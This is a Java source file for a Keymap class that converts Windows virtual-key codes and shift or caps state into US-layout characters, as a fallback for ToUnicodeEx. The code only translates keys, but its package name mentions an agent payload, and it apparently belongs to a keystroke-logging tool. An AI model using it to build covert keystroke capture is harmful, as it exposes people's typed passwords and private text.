package com.spcagentpayloa.jvmxx;

import java.util.Locale;

/** US-layout fallback for when ToUnicodeEx cannot resolve a key (dead keys, layouts). */
final class Keymap {
	private static final String[] SYMBOLS = {
		";", "=", ",", "-", ".", "/", "`", "[", "\\", "]", "'"
	};
	private static final String[] SHIFTED = {
		":", "+", "<", "_", ">", "?", "~", "{", "|", "}", "\""
	};
	private static final String DIGITS = "1234567890";
	private static final String SHIFT_DIGITS = "!@#$%^&*()";

	private Keymap() {
	}

	static String map(int vk, boolean shift, boolean caps, String unicode) {
		if (unicode != null && !unicode.isEmpty()) {
			return unicode.equals("\r") ? "\n" : unicode;
		}
		if (vk == 0x08) {
			return "\b";
		}
		if (vk == 0x09) {
			return "\t";
		}
		if (vk == 0x0d) {
			return "\n";
		}
		if (vk == 0x20) {
			return " ";
		}
		if (vk >= 0x41 && vk <= 0x5a) {
			char letter = (char) ('a' + (vk - 0x41));
			return shift ^ caps ? String.valueOf(Character.toUpperCase(letter)) : String.valueOf(letter);
		}
		if (vk >= 0x30 && vk <= 0x39) {
			int index = (vk - 0x30 + 9) % 10;
			return shift ? String.valueOf(SHIFT_DIGITS.charAt(index)) : String.valueOf(DIGITS.charAt(index));
		}
		if (vk >= 0x60 && vk <= 0x69) {
			return String.valueOf((char) ('0' + (vk - 0x60)));
		}
		if (vk >= 0xba && vk <= 0xc0) {
			int index = vk - 0xba;
			return shift ? SHIFTED[index] : SYMBOLS[index];
		}
		if (vk >= 0xdb && vk <= 0xde) {
			int index = 7 + (vk - 0xdb);
			return shift ? SHIFTED[index] : SYMBOLS[index];
		}
		return "";
	}

	static String clean(String text) {
		if (text == null) {
			return "";
		}
		return text.replace("\r", "").replace("\n", "").toLowerCase(Locale.ROOT);
	}
}
